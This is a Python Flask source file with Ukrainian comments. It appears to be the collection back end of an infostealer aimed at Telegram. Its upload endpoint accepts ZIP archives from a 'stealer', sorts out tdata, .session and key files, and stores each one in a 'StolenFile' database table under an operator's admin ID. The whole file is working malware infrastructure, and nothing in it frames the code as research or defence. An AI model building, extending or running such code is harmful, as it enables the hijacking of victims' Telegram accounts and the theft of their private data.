# web/api/routes.py - ВИПРАВЛЕНА ВЕРСІЯ
from flask import Blueprint, request, jsonify
import os
from datetime import datetime
import logging
from core.database import db_manager
from models.db_models import StolenFile
from core.security import encryption_manager
import zipfile
import json

api_bp = Blueprint('api', __name__)
logger = logging.getLogger(__name__)

def _get_file_type(filename: str) -> str:
    """Визначаємо тип файлу"""
    filename_lower = filename.lower()
    
    if 'tdata' in filename_lower:
        return 'tdata'
    elif filename_lower.endswith('.session'):
        return 'session'
    elif any(ext in filename_lower for ext in ['.dat', '.key', '.json']):
        return 'telegram_data'
    else:
        return 'other'

def _process_zip_archive(zip_path: str, upload_dir: str, admin_id: str) -> list:
    """Обробка ZIP архіву з даними"""
    extracted_files = []
    
    try:
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            # Отримуємо інформацію про клієнта
            if 'config.json' in zip_ref.namelist():
                config_data = zip_ref.read('config.json')
                config = json.loads(config_data.decode('utf-8'))
                logger.info(f"Client config: {config}")
            
            # Видобуваємо файли
            for file_info in zip_ref.infolist():
                if not file_info.is_dir() and file_info.filename != 'config.json':
                    # Видобуваємо файл
                    extracted_path = os.path.join(upload_dir, f"extracted_{os.path.basename(file_info.filename)}")
                    with open(extracted_path, 'wb') as f:
                        f.write(zip_ref.read(file_info.filename))
                    
                    # Визначаємо тип файлу
                    file_type = _get_file_type(file_info.filename)
                    
                    # Записуємо в базу даних
                    db_session = db_manager.get_session()
                    try:
                        stolen_file = StolenFile(
                            client_id=request.remote_addr,
                            ip_address=request.remote_addr,
                            data_type=file_type,
                            file_path=extracted_path,
                            file_size=os.path.getsize(extracted_path),
                            admin_id=int(admin_id)
                        )
                        db_session.add(stolen_file)
                        db_session.commit()
                        
                        extracted_files.append({
                            'filename': file_info.filename,
                            'type': file_type,
                            'size': os.path.getsize(extracted_path)
                        })
                        
                        logger.info(f"Saved extracted file: {file_info.filename} ({file_type})")
                        
                    except Exception as e:
                        db_session.rollback()
                        logger.error(f"Database error for file {file_info.filename}: {e}")
                    finally:
                        db_session.close()
        
        return extracted_files
        
    except Exception as e:
        logger.error(f"ZIP processing error: {e}")
        return []

@api_bp.route('/upload', methods=['POST'])
def upload_stolen_files():
    """API endpoint для отримання вкрадених файлів від функціонального стіллера"""
    try:
        # Отримуємо дані з запиту
        admin_id = request.form.get('admin_id', '1')
        client_info = request.form.get('client_id', '{}')
        
        # Отримуємо файл
        if 'file' not in request.files:
            return jsonify({'status': 'error', 'message': 'No file provided'}), 400
        
        file = request.files['file']
        if file.filename == '':
            return jsonify({'status': 'error', 'message': 'No file selected'}), 400
        
        logger.info(f"Received file from client: {client_info} for admin {admin_id}")
        
        # Створюємо папку для адміна
        admin_upload_dir = f"uploads/stolen_files/{admin_id}"
        os.makedirs(admin_upload_dir, exist_ok=True)
        
        # Зберігаємо отриманий файл
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{timestamp}_{file.filename}"
        file_path = os.path.join(admin_upload_dir, filename)
        file.save(file_path)
        
        # Обробляємо ZIP архів
        extracted_files = _process_zip_archive(file_path, admin_upload_dir, admin_id)
        
        return jsonify({
            'status': 'success',
            'message': f'Received and processed {len(extracted_files)} files',
            'files': extracted_files,
            'admin_id': admin_id
        })
        
    except Exception as e:
        logger.error(f"Upload error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500